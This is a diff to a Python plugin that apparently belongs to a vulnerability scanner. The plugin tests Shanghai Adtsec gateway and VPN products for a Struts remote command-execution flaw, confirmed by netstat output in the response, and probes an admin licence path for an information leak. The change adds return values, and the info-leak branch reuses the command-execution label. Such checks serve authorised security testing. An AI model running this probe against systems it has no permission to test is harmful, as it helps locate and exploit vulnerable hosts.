@@ -25,24 +25,26 @@ class adtsec_gateway_struts_exec_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"Active Internet connections" in req.text:
                 cprint("[+]存在上海安达通某网关产品&某VPN产品struts命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]", "red")
-
+                return True, vulnurl, "上海安达通某网关产品&某VPN产品struts命令执行", payload, req.text
             elif r"Active Connections" in req.text or r"活动连接" in req.text:
                 cprint("[+]存在上海安达通某网关产品&某VPN产品struts命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]", "red")
-
+                return True, vulnurl, "上海安达通某网关产品&某VPN产品struts命令执行", payload, req.text
             elif r"LISTEN" in req.text:
                 cprint("[+]可能存在上海安达通某网关产品&某VPN产品struts命令执行漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                return True, vulnurl, "上海安达通某网关产品&某VPN产品struts命令执行", payload, req.text
             else:
                 pass
             vulnurl = self.url + "/lan/admin_getLisence"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"beginrecord" in req.text and r"asave" in req.text:
                 cprint("[+]存在上海安达通某网关产品&某VPN产品struts信息泄露漏洞...(低危)\tpayload: "+vulnurl, "green")
+                return True, vulnurl, "上海安达通某网关产品&某VPN产品struts命令执行", payload, req.text
             else:
                 cprint("[-]不存在adtsec_gateway_struts_exec漏洞", "white", "on_grey")
-
+                return False, None, None, None, None
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
